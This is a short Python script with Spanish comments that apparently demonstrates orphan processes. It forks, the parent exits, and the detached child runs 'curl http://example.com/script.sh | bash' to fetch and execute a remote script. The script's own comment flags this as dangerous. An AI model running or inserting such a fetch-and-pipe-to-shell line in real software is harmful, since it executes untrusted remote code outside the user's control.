import os, time


pid = os.fork()

if pid > 0:
    os._exit(0)  # El padre termina inmediatamente
    
else:
    print("[HIJO] Ejecutando script como huérfano...")
    os.system("curl http://example.com/script.sh | bash")  # Peligroso si no hay control
    time.sleep(3)